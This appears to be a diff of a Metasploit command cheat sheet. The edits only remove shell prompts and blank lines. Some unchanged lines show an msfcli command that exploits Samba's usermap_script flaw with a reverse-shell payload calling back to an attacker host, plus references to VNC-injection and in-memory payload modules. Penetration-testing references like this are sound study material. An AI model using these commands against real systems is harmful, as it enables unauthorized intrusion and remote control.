@@ -3,21 +3,21 @@ Metasploit
 
 # msfcli
 
-root@kali:~# msfcli -h
+msfcli -h
 
 All options are case-sensitive. 
-root@kali:~# msfcli exploit/multi/samba/usermap_script RHOST=10.0.0.20 PAYLOAD=cmd/unix/reverse LHOST=10.0.0.5 E
+msfcli exploit/multi/samba/usermap_script RHOST=10.0.0.20 PAYLOAD=cmd/unix/reverse LHOST=10.0.0.5 E
 
 If you are not sure about what options belong to a particular module, you can append the letter 'O' to the end of the string. 
-root@kali:~# msfcli exploit/multi/samba/usermap_script O
+msfcli exploit/multi/samba/usermap_script O
 
 To display the payloads that are available for the current module, append the letter 'P' to the end of the string.
-root@kali:~# msfcli exploit/multi/samba/usermap_script P
+msfcli exploit/multi/samba/usermap_script P
 ------------------------------------------------------------------------------------------------------
 
 # msfconsole
 
-root@kali:~# msfconsole
+msfconsole
 
 help or ?                     List available commands and their descriptions.
 ------------------------------------------------------------------------------------------------------
@@ -111,7 +111,6 @@ workspace                     List workspaces.
 workspace -a [name]           Add workspace(s).
 workspace -d [name]           Delete workspace(s).
 workspace -r <old> <new>      Rename workspace.
-
 ------------------------------------------------------------------------------------------------------
 
 # Apache Tomcat Manager Common Administrative Credentials
@@ -457,3 +456,4 @@ run
 getgui will not work on Windows 2000 Server. Instead try: set PAYLOAD windows/vncinject/reverse_tcp
 
 For injecting into memory: use exploit/windows/local/payload_inject
+
